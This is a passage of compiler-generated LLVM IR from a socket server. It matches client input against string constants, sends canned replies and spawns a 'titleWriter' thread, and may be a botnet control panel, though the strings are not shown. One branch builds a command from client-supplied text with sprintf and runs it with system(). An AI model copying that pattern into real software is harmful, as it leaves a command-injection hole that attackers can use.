  %610 = call i64 @send(i32 %93, i8* nonnull %174, i64 %609, i32 16384) #10
  %611 = icmp eq i64 %610, -1
  br i1 %611, label %.loopexit.loopexit, label %612

; <label>:612:                                    ; preds = %608
  %613 = call i64 @strlen(i8* nonnull %175) #9
  %614 = call i64 @send(i32 %93, i8* nonnull %175, i64 %613, i32 16384) #10
  %615 = icmp eq i64 %614, -1
  br i1 %615, label %.loopexit.loopexit, label %616

; <label>:616:                                    ; preds = %612
  %617 = call i64 @strlen(i8* nonnull %176) #9
  %618 = call i64 @send(i32 %93, i8* nonnull %176, i64 %617, i32 16384) #10
  %619 = icmp eq i64 %618, -1
  br i1 %619, label %.loopexit.loopexit, label %620

; <label>:620:                                    ; preds = %616
  %621 = call i64 @strlen(i8* nonnull %177) #9
  %622 = call i64 @send(i32 %93, i8* nonnull %177, i64 %621, i32 16384) #10
  %623 = icmp eq i64 %622, -1
  br i1 %623, label %.loopexit.loopexit, label %624

; <label>:624:                                    ; preds = %620
  %625 = call i64 @strlen(i8* nonnull %178) #9
  %626 = call i64 @send(i32 %93, i8* nonnull %178, i64 %625, i32 16384) #10
  %627 = icmp eq i64 %626, -1
  br i1 %627, label %.loopexit.loopexit, label %628

; <label>:628:                                    ; preds = %624
  %629 = call i64 @strlen(i8* nonnull %179) #9
  %630 = call i64 @send(i32 %93, i8* nonnull %179, i64 %629, i32 16384) #10
  %631 = icmp eq i64 %630, -1
  br i1 %631, label %.loopexit.loopexit, label %632

; <label>:632:                                    ; preds = %628
  %633 = call i64 @strlen(i8* nonnull %180) #9
  %634 = call i64 @send(i32 %93, i8* nonnull %180, i64 %633, i32 16384) #10
  %635 = icmp eq i64 %634, -1
  br i1 %635, label %.loopexit.loopexit, label %636

; <label>:636:                                    ; preds = %632
  %637 = call i64 @strlen(i8* nonnull %181) #9
  %638 = call i64 @send(i32 %93, i8* nonnull %181, i64 %637, i32 16384) #10
  %639 = icmp eq i64 %638, -1
  br i1 %639, label %.loopexit.loopexit, label %640

; <label>:640:                                    ; preds = %636
  %641 = call i64 @strlen(i8* nonnull %182) #9
  %642 = call i64 @send(i32 %93, i8* nonnull %182, i64 %641, i32 16384) #10
  %643 = icmp eq i64 %642, -1
  br i1 %643, label %.loopexit.loopexit, label %644

; <label>:644:                                    ; preds = %640
  %645 = call i64 @strlen(i8* nonnull %183) #9
  %646 = call i64 @send(i32 %93, i8* nonnull %183, i64 %645, i32 16384) #10
  %647 = icmp eq i64 %646, -1
  br i1 %647, label %.loopexit.loopexit, label %648

; <label>:648:                                    ; preds = %644
  %649 = call i64 @strlen(i8* nonnull %184) #9
  %650 = call i64 @send(i32 %93, i8* nonnull %184, i64 %649, i32 16384) #10
  %651 = icmp eq i64 %650, -1
  br i1 %651, label %.loopexit.loopexit, label %652

; <label>:652:                                    ; preds = %648
  %653 = call i64 @strlen(i8* nonnull %185) #9
  %654 = call i64 @send(i32 %93, i8* nonnull %185, i64 %653, i32 16384) #10
  %655 = icmp eq i64 %654, -1
  br i1 %655, label %.loopexit.loopexit, label %656

; <label>:656:                                    ; preds = %652
  %657 = call i64 @strlen(i8* nonnull %186) #9
  %658 = call i64 @send(i32 %93, i8* nonnull %186, i64 %657, i32 16384) #10
  %659 = icmp eq i64 %658, -1
  br i1 %659, label %.loopexit.loopexit, label %660

; <label>:660:                                    ; preds = %656
  %661 = call i64 @strlen(i8* nonnull %187) #9
  %662 = call i64 @send(i32 %93, i8* nonnull %187, i64 %661, i32 16384) #10
  %663 = icmp eq i64 %662, -1
  br i1 %663, label %.loopexit.loopexit, label %664

; <label>:664:                                    ; preds = %660
  %665 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %666 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %667 = call i64 @strlen(i8* nonnull %97) #9
  %668 = call i64 @send(i32 %93, i8* nonnull %97, i64 %667, i32 16384) #10
  %669 = icmp eq i64 %668, -1
  br i1 %669, label %.loopexit.loopexit, label %.backedge

; <label>:670:                                    ; preds = %568
  %671 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i64 0, i64 0)) #9
  %672 = icmp eq i8* %671, null
  br i1 %672, label %673, label %685

; <label>:673:                                    ; preds = %670
  %674 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i64 0, i64 0)) #9
  %675 = icmp eq i8* %674, null
  br i1 %675, label %676, label %685

; <label>:676:                                    ; preds = %673
  %677 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0)) #9
  %678 = icmp eq i8* %677, null
  br i1 %678, label %679, label %685

; <label>:679:                                    ; preds = %676
  %680 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i64 0, i64 0)) #9
  %681 = icmp eq i8* %680, null
  br i1 %681, label %682, label %685

; <label>:682:                                    ; preds = %679
  %683 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i64 0, i64 0)) #9
  %684 = icmp eq i8* %683, null
  br i1 %684, label %724, label %685

; <label>:685:                                    ; preds = %682, %679, %676, %673, %670
  %686 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %157, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %158, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %159, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.117, i64 0, i64 0), i64 95, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %160, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.118, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %161, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.119, i64 0, i64 0), i64 73, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %162, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.120, i64 0, i64 0), i64 72, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %163, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.121, i64 0, i64 0), i64 73, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %164, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i64 0, i64 0), i64 84, i32 1, i1 false)
  %687 = call i64 @strlen(i8* nonnull %157) #9
  %688 = call i64 @send(i32 %93, i8* nonnull %157, i64 %687, i32 16384) #10
  %689 = icmp eq i64 %688, -1
  br i1 %689, label %.loopexit.loopexit, label %690

; <label>:690:                                    ; preds = %685
  %691 = call i64 @strlen(i8* nonnull %158) #9
  %692 = call i64 @send(i32 %93, i8* nonnull %158, i64 %691, i32 16384) #10
  %693 = icmp eq i64 %692, -1
  br i1 %693, label %.loopexit.loopexit, label %694

; <label>:694:                                    ; preds = %690
  %695 = call i64 @strlen(i8* nonnull %159) #9
  %696 = call i64 @send(i32 %93, i8* nonnull %159, i64 %695, i32 16384) #10
  %697 = icmp eq i64 %696, -1
  br i1 %697, label %.loopexit.loopexit, label %698

; <label>:698:                                    ; preds = %694
  %699 = call i64 @strlen(i8* nonnull %160) #9
  %700 = call i64 @send(i32 %93, i8* nonnull %160, i64 %699, i32 16384) #10
  %701 = icmp eq i64 %700, -1
  br i1 %701, label %.loopexit.loopexit, label %702

; <label>:702:                                    ; preds = %698
  %703 = call i64 @strlen(i8* nonnull %161) #9
  %704 = call i64 @send(i32 %93, i8* nonnull %161, i64 %703, i32 16384) #10
  %705 = icmp eq i64 %704, -1
  br i1 %705, label %.loopexit.loopexit, label %706

; <label>:706:                                    ; preds = %702
  %707 = call i64 @strlen(i8* nonnull %162) #9
  %708 = call i64 @send(i32 %93, i8* nonnull %162, i64 %707, i32 16384) #10
  %709 = icmp eq i64 %708, -1
  br i1 %709, label %.loopexit.loopexit, label %710

; <label>:710:                                    ; preds = %706
  %711 = call i64 @strlen(i8* nonnull %163) #9
  %712 = call i64 @send(i32 %93, i8* nonnull %163, i64 %711, i32 16384) #10
  %713 = icmp eq i64 %712, -1
  br i1 %713, label %.loopexit.loopexit, label %714

; <label>:714:                                    ; preds = %710
  %715 = call i64 @strlen(i8* nonnull %164) #9
  %716 = call i64 @send(i32 %93, i8* nonnull %164, i64 %715, i32 16384) #10
  %717 = icmp eq i64 %716, -1
  br i1 %717, label %.loopexit.loopexit, label %718

; <label>:718:                                    ; preds = %714
  %719 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %720 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i64 0, i64 0), i8* %126, i8* nonnull %96) #10
  %721 = call i64 @strlen(i8* nonnull %97) #9
  %722 = call i64 @send(i32 %93, i8* nonnull %97, i64 %721, i32 16384) #10
  %723 = icmp eq i64 %722, -1
  br i1 %723, label %.loopexit.loopexit, label %.backedge

; <label>:724:                                    ; preds = %682
  %725 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.122, i64 0, i64 0)) #9
  %726 = icmp eq i8* %725, null
  br i1 %726, label %732, label %727

; <label>:727:                                    ; preds = %724
  %728 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %729 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %730 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %729, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %731 = call i32 @fclose(%struct._IO_FILE* %729)
  br label %.loopexit

; <label>:732:                                    ; preds = %724
  %733 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i64 0, i64 0)) #9
  %734 = icmp eq i8* %733, null
  br i1 %734, label %740, label %735

; <label>:735:                                    ; preds = %732
  %736 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %737 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %738 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %737, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %739 = call i32 @fclose(%struct._IO_FILE* %737)
  br label %.loopexit

; <label>:740:                                    ; preds = %732
  %741 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i64 0, i64 0)) #9
  %742 = icmp eq i8* %741, null
  br i1 %742, label %743, label %746

; <label>:743:                                    ; preds = %740
  %744 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i64 0, i64 0)) #9
  %745 = icmp eq i8* %744, null
  br i1 %745, label %751, label %746

; <label>:746:                                    ; preds = %743, %740
  %747 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.128, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %748 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  %749 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %748, i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.130, i64 0, i64 0), i8* %126, i8* nonnull %96)
  %750 = call i32 @fclose(%struct._IO_FILE* %748)
  br label %.loopexit

; <label>:751:                                    ; preds = %743
  %752 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i64 0, i64 0)) #9
  %753 = icmp eq i8* %752, null
  br i1 %753, label %754, label %757

; <label>:754:                                    ; preds = %751
  %755 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.132, i64 0, i64 0)) #9
  %756 = icmp eq i8* %755, null
  br i1 %756, label %761, label %757

; <label>:757:                                    ; preds = %754, %751
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i64 0, i64 0), i64 25, i32 1, i1 false)
  %758 = call i64 @strlen(i8* nonnull %97) #9
  %759 = call i64 @send(i32 %93, i8* nonnull %97, i64 %758, i32 16384) #10
  %760 = icmp eq i64 %759, -1
  br i1 %760, label %.loopexit209.loopexit, label %761

; <label>:761:                                    ; preds = %754, %757
  %762 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.134, i64 0, i64 0)) #9
  %763 = icmp eq i8* %762, null
  br i1 %763, label %768, label %764

; <label>:764:                                    ; preds = %761
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i64 0, i64 0), i64 71, i32 1, i1 false)
  %765 = call i64 @strlen(i8* nonnull %97) #9
  %766 = call i64 @send(i32 %93, i8* nonnull %97, i64 %765, i32 16384) #10
  %767 = icmp eq i64 %766, -1
  br i1 %767, label %.loopexit209.loopexit, label %768

; <label>:768:                                    ; preds = %761, %764
  %769 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.136, i64 0, i64 0)) #9
  %770 = icmp eq i8* %769, null
  br i1 %770, label %775, label %771

; <label>:771:                                    ; preds = %768
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.137, i64 0, i64 0), i64 71, i32 1, i1 false)
  %772 = call i64 @strlen(i8* nonnull %97) #9
  %773 = call i64 @send(i32 %93, i8* nonnull %97, i64 %772, i32 16384) #10
  %774 = icmp eq i64 %773, -1
  br i1 %774, label %.loopexit209.loopexit, label %775

; <label>:775:                                    ; preds = %768, %771
  %776 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i64 0, i64 0)) #9
  %777 = icmp eq i8* %776, null
  br i1 %777, label %778, label %781

; <label>:778:                                    ; preds = %775
  %779 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.139, i64 0, i64 0)) #9
  %780 = icmp eq i8* %779, null
  br i1 %780, label %795, label %781

; <label>:781:                                    ; preds = %778, %775
  %782 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i8* %155) #9
  %783 = icmp eq i32 %782, 0
  br i1 %783, label %784, label %792

; <label>:784:                                    ; preds = %781
  %785 = call i8* @strtok(i8* nonnull %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i64 0, i64 0)) #10
  %786 = getelementptr inbounds i8, i8* %785, i64 8
  call void @trim(i8* %786)
  %787 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %786, i8** nonnull %156) #10
  %788 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.141, i64 0, i64 0), i8* %786, i8** nonnull %156) #10
  %789 = call i64 @strlen(i8* nonnull %97) #9
  %790 = call i64 @send(i32 %93, i8* nonnull %97, i64 %789, i32 16384) #10
  %791 = icmp eq i64 %790, -1
  br i1 %791, label %.loopexit209.loopexit, label %795

; <label>:792:                                    ; preds = %781
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i64 0, i64 0), i64 60, i32 1, i1 false)
  %793 = call i64 @strlen(i8* nonnull %97) #9
  %794 = call i64 @send(i32 %93, i8* nonnull %97, i64 %793, i32 16384) #10
  br label %795

; <label>:795:                                    ; preds = %778, %792, %784
  %796 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.143, i64 0, i64 0)) #9
  %797 = icmp eq i8* %796, null
  br i1 %797, label %798, label %801

; <label>:798:                                    ; preds = %795
  %799 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i64 0, i64 0)) #9
  %800 = icmp eq i8* %799, null
  br i1 %800, label %817, label %801

; <label>:801:                                    ; preds = %798, %795
  %802 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i64 0, i64 0), i8* %153) #9
  %803 = icmp eq i32 %802, 0
  br i1 %803, label %804, label %814

; <label>:804:                                    ; preds = %801
  %805 = call i8* @strtok(i8* nonnull %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.140, i64 0, i64 0)) #10
  %806 = getelementptr inbounds i8, i8* %805, i64 8
  call void @trim(i8* %806)
  %807 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %154, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.145, i64 0, i64 0), i8* %806) #10
  %808 = call i32 @system(i8* nonnull %154) #10
  %809 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.146, i64 0, i64 0), i8* %126, i8* %806)
  %810 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.147, i64 0, i64 0), i8* %126, i8* %806) #10
  %811 = call i64 @strlen(i8* nonnull %97) #9
  %812 = call i64 @send(i32 %93, i8* nonnull %97, i64 %811, i32 16384) #10
  %813 = icmp eq i64 %812, -1
  br i1 %813, label %.loopexit209.loopexit, label %817

; <label>:814:                                    ; preds = %801
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.142, i64 0, i64 0), i64 60, i32 1, i1 false)
  %815 = call i64 @strlen(i8* nonnull %97) #9
  %816 = call i64 @send(i32 %93, i8* nonnull %97, i64 %815, i32 16384) #10
  br label %817

; <label>:817:                                    ; preds = %798, %814, %804
  %818 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.148, i64 0, i64 0)) #9
  %819 = icmp eq i8* %818, null
  br i1 %819, label %824, label %820

; <label>:820:                                    ; preds = %817
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.149, i64 0, i64 0), i64 71, i32 1, i1 false)
  %821 = call i64 @strlen(i8* nonnull %97) #9
  %822 = call i64 @send(i32 %93, i8* nonnull %97, i64 %821, i32 16384) #10
  %823 = icmp eq i64 %822, -1
  br i1 %823, label %.loopexit209.loopexit, label %824

; <label>:824:                                    ; preds = %817, %820
  %825 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i64 0, i64 0)) #9
  %826 = icmp eq i8* %825, null
  br i1 %826, label %831, label %827

; <label>:827:                                    ; preds = %824
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i64 0, i64 0), i64 72, i32 1, i1 false)
  %828 = call i64 @strlen(i8* nonnull %97) #9
  %829 = call i64 @send(i32 %93, i8* nonnull %97, i64 %828, i32 16384) #10
  %830 = icmp eq i64 %829, -1
  br i1 %830, label %.loopexit209.loopexit, label %831

; <label>:831:                                    ; preds = %824, %827
  %832 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.152, i64 0, i64 0)) #9
  %833 = icmp eq i8* %832, null
  br i1 %833, label %838, label %834

; <label>:834:                                    ; preds = %831
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i64 0, i64 0), i64 72, i32 1, i1 false)
  %835 = call i64 @strlen(i8* nonnull %97) #9
  %836 = call i64 @send(i32 %93, i8* nonnull %97, i64 %835, i32 16384) #10
  %837 = icmp eq i64 %836, -1
  br i1 %837, label %.loopexit209.loopexit, label %838

; <label>:838:                                    ; preds = %831, %834
  %839 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.153, i64 0, i64 0)) #9
  %840 = icmp eq i8* %839, null
  br i1 %840, label %845, label %841

; <label>:841:                                    ; preds = %838
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.151, i64 0, i64 0), i64 72, i32 1, i1 false)
  %842 = call i64 @strlen(i8* nonnull %97) #9
  %843 = call i64 @send(i32 %93, i8* nonnull %97, i64 %842, i32 16384) #10
  %844 = icmp eq i64 %843, -1
  br i1 %844, label %.loopexit209.loopexit, label %845

; <label>:845:                                    ; preds = %838, %841
  %846 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.154, i64 0, i64 0)) #9
  %847 = icmp eq i8* %846, null
  br i1 %847, label %852, label %848

; <label>:848:                                    ; preds = %845
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.155, i64 0, i64 0), i64 57, i32 1, i1 false)
  %849 = call i64 @strlen(i8* nonnull %97) #9
  %850 = call i64 @send(i32 %93, i8* nonnull %97, i64 %849, i32 16384) #10
  %851 = icmp eq i64 %850, -1
  br i1 %851, label %.loopexit209.loopexit, label %852

; <label>:852:                                    ; preds = %845, %848
  %853 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.156, i64 0, i64 0)) #9
  %854 = icmp eq i8* %853, null
  br i1 %854, label %859, label %855

; <label>:855:                                    ; preds = %852
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.157, i64 0, i64 0), i64 72, i32 1, i1 false)
  %856 = call i64 @strlen(i8* nonnull %97) #9
  %857 = call i64 @send(i32 %93, i8* nonnull %97, i64 %856, i32 16384) #10
  %858 = icmp eq i64 %857, -1
  br i1 %858, label %.loopexit209.loopexit, label %859

; <label>:859:                                    ; preds = %852, %855
  %860 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.158, i64 0, i64 0)) #9
  %861 = icmp eq i8* %860, null
  br i1 %861, label %866, label %862

; <label>:862:                                    ; preds = %859
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.159, i64 0, i64 0), i64 124, i32 1, i1 false)
  %863 = call i64 @strlen(i8* nonnull %97) #9
  %864 = call i64 @send(i32 %93, i8* nonnull %97, i64 %863, i32 16384) #10
  %865 = icmp eq i64 %864, -1
  br i1 %865, label %.loopexit209.loopexit, label %866

; <label>:866:                                    ; preds = %859, %862
  %867 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i64 0, i64 0)) #9
  %868 = icmp eq i8* %867, null
  br i1 %868, label %873, label %869

; <label>:869:                                    ; preds = %866
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.161, i64 0, i64 0), i64 103, i32 1, i1 false)
  %870 = call i64 @strlen(i8* nonnull %97) #9
  %871 = call i64 @send(i32 %93, i8* nonnull %97, i64 %870, i32 16384) #10
  %872 = icmp eq i64 %871, -1
  br i1 %872, label %.loopexit209.loopexit, label %873

; <label>:873:                                    ; preds = %866, %869
  %874 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.162, i64 0, i64 0)) #9
  %875 = icmp eq i8* %874, null
  br i1 %875, label %880, label %876

; <label>:876:                                    ; preds = %873
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.163, i64 0, i64 0), i64 74, i32 1, i1 false)
  %877 = call i64 @strlen(i8* nonnull %97) #9
  %878 = call i64 @send(i32 %93, i8* nonnull %97, i64 %877, i32 16384) #10
  %879 = icmp eq i64 %878, -1
  br i1 %879, label %.loopexit209.loopexit, label %880

; <label>:880:                                    ; preds = %873, %876
  %881 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.164, i64 0, i64 0)) #9
  %882 = icmp eq i8* %881, null
  br i1 %882, label %887, label %883

; <label>:883:                                    ; preds = %880
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.165, i64 0, i64 0), i64 74, i32 1, i1 false)
  %884 = call i64 @strlen(i8* nonnull %97) #9
  %885 = call i64 @send(i32 %93, i8* nonnull %97, i64 %884, i32 16384) #10
  %886 = icmp eq i64 %885, -1
  br i1 %886, label %.loopexit209.loopexit, label %887

; <label>:887:                                    ; preds = %880, %883
  %888 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.166, i64 0, i64 0)) #9
  %889 = icmp eq i8* %888, null
  br i1 %889, label %894, label %890

; <label>:890:                                    ; preds = %887
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.167, i64 0, i64 0), i64 74, i32 1, i1 false)
  %891 = call i64 @strlen(i8* nonnull %97) #9
  %892 = call i64 @send(i32 %93, i8* nonnull %97, i64 %891, i32 16384) #10
  %893 = icmp eq i64 %892, -1
  br i1 %893, label %.loopexit209.loopexit, label %894

; <label>:894:                                    ; preds = %887, %890
  %895 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.168, i64 0, i64 0)) #9
  %896 = icmp eq i8* %895, null
  br i1 %896, label %901, label %897

; <label>:897:                                    ; preds = %894
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.169, i64 0, i64 0), i64 74, i32 1, i1 false)
  %898 = call i64 @strlen(i8* nonnull %97) #9
  %899 = call i64 @send(i32 %93, i8* nonnull %97, i64 %898, i32 16384) #10
  %900 = icmp eq i64 %899, -1
  br i1 %900, label %.loopexit209.loopexit, label %901

; <label>:901:                                    ; preds = %894, %897
  %902 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.170, i64 0, i64 0)) #9
  %903 = icmp eq i8* %902, null
  br i1 %903, label %908, label %904

; <label>:904:                                    ; preds = %901
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.171, i64 0, i64 0), i64 74, i32 1, i1 false)
  %905 = call i64 @strlen(i8* nonnull %97) #9
  %906 = call i64 @send(i32 %93, i8* nonnull %97, i64 %905, i32 16384) #10
  %907 = icmp eq i64 %906, -1
  br i1 %907, label %.loopexit209.loopexit, label %908

; <label>:908:                                    ; preds = %901, %904
  %909 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.172, i64 0, i64 0)) #9
  %910 = icmp eq i8* %909, null
  br i1 %910, label %915, label %911

; <label>:911:                                    ; preds = %908
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %97, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.173, i64 0, i64 0), i64 74, i32 1, i1 false)
  %912 = call i64 @strlen(i8* nonnull %97) #9
  %913 = call i64 @send(i32 %93, i8* nonnull %97, i64 %912, i32 16384) #10
  %914 = icmp eq i64 %913, -1
  br i1 %914, label %.loopexit209.loopexit, label %915

; <label>:915:                                    ; preds = %908, %911
  %916 = call i8* @strstr(i8* nonnull %96, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.174, i64 0, i64 0)) #9
  %917 = icmp eq i8* %916, null
  br i1 %917, label %922, label %918

; <label>:918:                                    ; preds = %915
